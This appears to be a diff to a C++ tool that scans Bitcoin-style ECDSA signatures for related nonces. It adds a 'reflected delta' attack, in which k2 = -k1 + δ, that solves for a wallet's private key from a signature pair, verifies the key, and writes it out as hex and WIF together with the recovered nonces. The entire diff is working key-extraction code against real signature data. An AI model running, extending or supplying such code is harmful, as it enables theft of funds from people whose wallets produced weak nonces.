@@ -641,6 +641,128 @@ static int delta_scan_bucket(Ctx& C, Secp& S, const vector<Row>& rows,
     return hits;
 }
 
+// ------------------------------- Reflected delta scan (k2 = -k1 + δ) -------------------------------
+static int reflected_delta_scan_bucket(Ctx& C, Secp& S, const vector<Row>& rows,
+                                       const vector<uint64_t>& gradient, const vector<uint64_t>& step_sched,
+                                       bool nopub, int per_pair_cap,
+                                       RecStore& store, const string& out_json, const string& out_txt, const string& out_delta,
+                                       size_t& pairs_tested)
+{
+    unordered_map<string, vector<int>> groups;
+    groups.reserve(rows.size());
+    for(int i=0;i<(int)rows.size();++i){
+        if(nopub) groups["_"].push_back(i);
+        else{
+            if(rows[i].pub.empty()) continue;
+            groups[rows[i].pub].push_back(i);
+        }
+    }
+
+    int hits=0;
+    BNWrap denom, denom_inv, sumB, delta, d, k1, k2, ksum, tmp1, tmp2;
+
+    for(auto& g: groups){
+        auto& idx = g.second;
+        if((int)idx.size()<2) continue;
+
+        int local_cap = min(per_pair_cap, max(256, (int)(64.0 * log2((double)idx.size()+1.0))));
+
+        for(int a=0;a<(int)idx.size();++a){
+            for(int b=a+1;b<(int)idx.size();++b){
+                pairs_tested++;
+                const Row& R1 = rows[idx[a]];
+                const Row& R2 = rows[idx[b]];
+                if(R1.r_hex == R2.r_hex) continue; // exact reflection is already handled by duplicate-r.
+
+                // k_i = A_i*d + B_i.  k2 = -k1 + δ =>
+                // (A1 + A2)*d = δ - (B1 + B2).
+                BN_mod_add(denom.n, R1.A.n, R2.A.n, C.N, C.ctx);
+                if(BN_is_zero(denom.n)) continue;
+                if(!bn_invm(C, denom.n, denom_inv.n)) continue;
+                BN_mod_add(sumB.n, R1.B.n, R2.B.n, C.N, C.ctx);
+
+                int tried=0; bool found=false;
+                auto try_signed_delta = [&](int64_t del)->bool{
+                    tried++;
+                    bn_set_int64_mod(C, del, delta.n);
+
+                    BN_mod_sub(d.n, delta.n, sumB.n, C.N, C.ctx);
+                    BN_mod_mul(d.n, d.n, denom_inv.n, C.N, C.ctx);
+
+                    BN_mod_mul(k1.n, R1.A.n, d.n, C.N, C.ctx);
+                    BN_mod_add(k1.n, k1.n, R1.B.n, C.N, C.ctx);
+                    BN_mod_mul(k2.n, R2.A.n, d.n, C.N, C.ctx);
+                    BN_mod_add(k2.n, k2.n, R2.B.n, C.N, C.ctx);
+
+                    BN_mod_add(ksum.n, k1.n, k2.n, C.N, C.ctx);
+                    if(BN_cmp(ksum.n, delta.n) != 0) return false;
+
+                    if(!ecdsa_ok(C, R1.s.n, R1.z.n, R1.r.n, d.n, k1.n, tmp1, tmp2)) return false;
+                    if(!ecdsa_ok(C, R2.s.n, R2.z.n, R2.r.n, d.n, k2.n, tmp1, tmp2)) return false;
+                    if(!r_from_k_matches(C, S, R1.r_hex, k1.n)) return false;
+                    if(!r_from_k_matches(C, S, R2.r_hex, k2.n)) return false;
+
+                    string pub_out;
+                    string dhex = bn_hex(d.n);
+                    if(!nopub){
+                        auto pubs = S.pub_from_priv_bn(dhex);
+                        if(R1.pub!=pubs.first && R1.pub!=pubs.second) return false;
+                        pub_out = R1.pub;
+                    }else{
+                        pub_out = S.pub_from_priv_bn(dhex).first;
+                    }
+
+                    store.add_priv(pub_out, dhex);
+                    GOUT.emit_unique_key(
+                        out_json,
+                        out_txt,
+                        pub_out,
+                        dhex,
+                        string("{\"pubkey\":\"") + pub_out + "\",\"priv_hex\":\"" + dhex +
+                        "\"," + wif_json_fields(dhex) + ",\"method\":\"reflected-delta\",\"delta\":\"" +
+                        bn_hex(delta.n) + "\",\"delta_signed\":\"" + to_string(del) + "\"}",
+                        string("PUB=") + pub_out + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
+                        " via " + R1.txid + ":" + to_string(R1.vin) + " & " + R2.txid + ":" + to_string(R2.vin) +
+                        " (reflected-delta=" + to_string(del) + ")"
+                    );
+                    ofstream(out_delta, ios::app)
+                        << "{\"pubkey\":\""<<pub_out<<"\",\"why\":\"reflected-delta\","
+                        << "\"delta\":\""<<bn_hex(delta.n)<<"\",\"delta_signed\":\""<<del<<"\","
+                        << "\"pair\":[{\"r\":\""<<R1.r_hex<<"\",\"s\":\""<<R1.s_hex<<"\",\"z\":\""<<R1.z_hex<<"\"},"
+                        << "{\"r\":\""<<R2.r_hex<<"\",\"s\":\""<<R2.s_hex<<"\",\"z\":\""<<R2.z_hex<<"\"}]}\n";
+
+                    store.add_k(R1.r_hex, bn_hex(k1.n));
+                    store.add_k(R2.r_hex, bn_hex(k2.n));
+                    BNWrap nk;
+                    BN_mod_sub(nk.n, C.N, k1.n, C.N, C.ctx); store.add_k(R1.r_hex, bn_hex(nk.n));
+                    BN_mod_sub(nk.n, C.N, k2.n, C.N, C.ctx); store.add_k(R2.r_hex, bn_hex(nk.n));
+                    hits++; found=true; return true;
+                };
+
+                auto try_schedule_value = [&](uint64_t del)->bool{
+                    if(del == 0) return false;
+                    if(del <= (uint64_t)LLONG_MAX && try_signed_delta((int64_t)del)) return true;
+                    if(tried >= local_cap) return false;
+                    if(del <= (uint64_t)LLONG_MAX && try_signed_delta(-((int64_t)del))) return true;
+                    return false;
+                };
+
+                for(uint64_t del: gradient){
+                    if(try_schedule_value(del)) break;
+                    if(tried>=local_cap) break;
+                }
+                if(!found){
+                    for(uint64_t del: step_sched){
+                        if(try_schedule_value(del)) break;
+                        if(tried>=local_cap) break;
+                    }
+                }
+            }
+        }
+    }
+    return hits;
+}
+
 // ------------------------------- Affine-LCG scan (k2 = a*k1 + b) -------------------------------
 static int lcg_scan_bucket(Ctx& C, Secp& S, const vector<Row>& rows,
                            long long a_max, long long b_max, int per_pair_cap,
@@ -1617,14 +1739,14 @@ int main(int argc, char** argv){
     build_delta_schedules(A, gradient, step_sched);
 
     atomic<size_t> bi{0};
-    size_t total_pairs_tested=0, total_dupR=0, total_delta=0, total_delta_nopub=0, total_lcg=0, total_random_k=0;
+    size_t total_pairs_tested=0, total_dupR=0, total_delta=0, total_reflected_delta=0, total_delta_nopub=0, total_lcg=0, total_random_k=0;
     mutex dirty_m, stat_m;
     unordered_set<string> dirty_buckets;
 
     auto process_one_bucket = [&](int){
         Ctx C;
         Secp Slocal;
-        size_t pairs_tested=0, f_dup=0, f_delta=0, f_delta_nopub=0, f_lcg=0;
+        size_t pairs_tested=0, f_dup=0, f_delta=0, f_reflected_delta=0, f_delta_nopub=0, f_lcg=0;
 
         for(;;){
             size_t i = bi.fetch_add(1);
@@ -1636,6 +1758,10 @@ int main(int argc, char** argv){
 
             f_dup   = try_primary_dupR(C, Slocal, rows, store, A.out_json, A.out_txt, A.out_k, pairs_tested);
             f_delta = delta_scan_bucket(C, Slocal, rows, gradient, step_sched, false, A.dg_per_pair_cap, store, A.out_json, A.out_txt, A.out_deltas, pairs_tested);
+            f_reflected_delta = reflected_delta_scan_bucket(
+                C, Slocal, rows, gradient, step_sched, false, A.dg_per_pair_cap,
+                store, A.out_json, A.out_txt, A.out_deltas, pairs_tested
+            );
             // Fallback path for buckets containing signatures without pubkey field.
             // This avoids losing potentially useful relations in script forms where pub is absent.
             bool has_empty_pub = false;
@@ -1672,7 +1798,7 @@ int main(int argc, char** argv){
                 }
             }
 
-            if(f_dup+f_delta+f_delta_nopub+f_lcg>0 || has_preloaded_seed){
+            if(f_dup+f_delta+f_reflected_delta+f_delta_nopub+f_lcg>0 || has_preloaded_seed){
                 lock_guard<mutex> lk(dirty_m);
                 dirty_buckets.insert(path);
             }
@@ -1681,6 +1807,7 @@ int main(int argc, char** argv){
                 total_pairs_tested += pairs_tested;
                 total_dupR += f_dup;
                 total_delta += f_delta;
+                total_reflected_delta += f_reflected_delta;
                 total_delta_nopub += f_delta_nopub;
                 total_lcg += f_lcg;
             }
@@ -1688,6 +1815,7 @@ int main(int argc, char** argv){
                 string("[bucket ") + fs::path(path).filename().string() + "] rows=" + to_string(rows.size()) +
                 " dupR=" + to_string(f_dup) +
                 " delta=" + to_string(f_delta) +
+                " reflected_delta=" + to_string(f_reflected_delta) +
                 " delta_nopub=" + to_string(f_delta_nopub) +
                 " lcg=" + to_string(f_lcg) +
                 " preload_seed=" + string(has_preloaded_seed ? "1" : "0") +
@@ -1806,6 +1934,7 @@ int main(int argc, char** argv){
 
     cerr<<"[stats] dupR_hits="<<total_dupR
         <<" delta_hits="<<total_delta
+        <<" reflected_delta_hits="<<total_reflected_delta
         <<" delta_nopub_hits="<<total_delta_nopub
         <<" lcg_hits="<<total_lcg
         <<" random_k_hits="<<total_random_k
